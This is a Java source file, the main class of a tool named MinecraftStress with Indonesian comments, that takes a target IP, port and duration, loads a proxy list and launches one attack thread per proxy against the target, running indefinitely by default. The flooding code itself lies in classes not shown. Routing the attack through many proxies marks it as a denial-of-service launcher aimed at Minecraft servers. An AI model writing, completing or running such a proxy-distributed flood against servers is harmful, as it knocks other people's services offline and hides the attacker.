package com.josemarcellio.minecraftstress;

import java.net.Proxy;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

public class MinecraftStress {

    private static final Logger LOGGER = Logger.getLogger(MinecraftStress.class.getName());

    public static void main(String[] args) {
        // Check argumen
        if (args.length < 2) {
            usage();
            return;
        }

        String targetIp = args[0];
        int targetPort = Integer.parseInt(args[1]);
        long attackDuration;

        if (args.length > 2) {
            int durationInSeconds = Integer.parseInt(args[2]);
            attackDuration = (long) durationInSeconds * 1000; // Konversi dari detik ke milidetik
        } else {
            attackDuration = Long.MAX_VALUE; // Atur durasi ke nilai sangat besar jika durasi tidak diberikan
        }

        try {
            // Load proxy
            List<Proxy> proxies = ProxyManager.loadProxies();
            ScheduledExecutorService executor = Executors.newScheduledThreadPool(proxies.size());
            long endTime = (attackDuration == Long.MAX_VALUE) ? Long.MAX_VALUE : System.currentTimeMillis() + attackDuration;

            // Run attack dan load proxy
            for (Proxy proxy : proxies) {
                executor.execute(new AttackTask(proxy, targetIp, targetPort, endTime));
            }

            // Close executor setelah selesai attack
            executor.shutdown();

            if (attackDuration != Long.MAX_VALUE) {
                if (!executor.awaitTermination(attackDuration, TimeUnit.MILLISECONDS)) {
                    LOGGER.warning("Executor tidak berhenti dalam durasi yang telah di setting.");
                }
            }
        } catch (Exception e) {
            LOGGER.log(Level.SEVERE, "Error load proxy atau attack failed: ", e);
        }
    }

    private static void usage() {
        LOGGER.info("java -jar MinecraftStress.jar <ipaddress> <port> <durasi>");
    }
}
